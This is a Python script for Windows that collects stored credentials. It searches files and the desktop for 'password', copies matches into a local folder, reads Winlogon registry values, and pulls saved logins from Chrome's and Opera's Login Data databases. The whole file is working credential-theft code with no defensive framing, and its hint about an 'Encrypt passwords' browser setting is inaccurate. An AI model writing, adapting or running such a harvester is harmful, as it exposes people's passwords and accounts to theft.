import os
import sqlite3
import winreg
import shutil


def copy_file(src_path, dest_dir):
    """
    Copies a file to a specified directory.

    :param src_path: The path of the source file.
    :param dest_dir: The path of the destination directory.
    """
    try:
        src_path = str(src_path)  # Ensure src_path is a string
        dest_dir = str(dest_dir)  # Ensure dest_dir is a string
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        dest_path = os.path.join(dest_dir, os.path.basename(src_path))
        shutil.copy2(src_path, dest_path)
        print(f"INFO: Copied file to: {dest_path}")
    except Exception as e:
        print(f"ERROR: {e}")


def search_filesystem():
    print("INFO: Searching the file system for passwords...")
    extensions = ['*.xml', '*.ini', '*.txt']
    for ext in extensions:
        for line in os.popen(f'findstr /si password {ext}'):
            # Split the line by ':' to separate the file path from the matched line
            parts = line.strip().split(':', 1)
            if len(parts) > 1:
                file_path = parts[0].strip()  # The first part is the file path
                print(f"INFO: Found password in file: {file_path}")
                copy_file(file_path, "DATA/found_passwords")


def search_desktop():
    print("INFO: Searching the desktop for password files...")
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    for file in os.listdir(desktop_path):
        if "password" in file.lower():
            file_path = os.path.join(desktop_path, file)
            print(f"INFO: Found password file on desktop: {file_path}")
            copy_file(file_path, "DATA/found_passwords")


def search_registry():
    print("INFO: Searching the registry for passwords...")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
        i = 0
        while True:
            try:
                value = winreg.EnumValue(key, i)
                if "password" in value[0].lower():
                    print(f"INFO: Found password in registry: {value[0]} = {value[1]}")
                i += 1
            except OSError:
                break
    except OSError:
        print("WARNING: Registry search failed.")


def search_google():
    print("INFO: Searching for stored passwords in browsers...")
    # Define the path to the Chrome Login Data file
    chrome_login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data",
                                          "Default", "Login Data")

    # Check if the file exists
    if not os.path.exists(chrome_login_data_path):
        print("WARNING: Chrome Login Data file not found. Is Chrome installed and the 'Encrypt passwords' feature disabled?")
        return

    # Connect to the SQLite database
    try:
        conn = sqlite3.connect(chrome_login_data_path)
        cursor = conn.cursor()

        # Execute a query to retrieve all stored passwords
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        if results:
            for result in results:
                print(f"INFO: Found password in Chrome: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
        else:
            print("WARNING: No passwords found in Chrome.")

        # Close the database connection
        conn.close()
    except sqlite3.Error as e:
        print(f"ERROR: Error accessing Chrome Login Data: {e}")


def search_opera():
    print("INFO: Searching for stored passwords in Opera...")
    opera_login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Opera Software",
                                         "Opera Stable", "Login Data")

    if not os.path.exists(opera_login_data_path):
        print("WARNING: Opera Login Data file not found. Is Opera installed and the 'Encrypt passwords' feature disabled?")
        return

    try:
        conn = sqlite3.connect(opera_login_data_path)
        cursor = conn.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        if results:
            for result in results:
                print(f"INFO: Found password in Opera: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
        else:
            print("WARNING: No passwords found in Opera.")

        conn.close()
    except sqlite3.Error as e:
        print(f"ERROR: Error accessing Opera Login Data: {e}")


def main():
    search_registry()
    search_filesystem()
    search_desktop()
    search_google()
    search_opera()


if __name__ == "__main__":
    main()
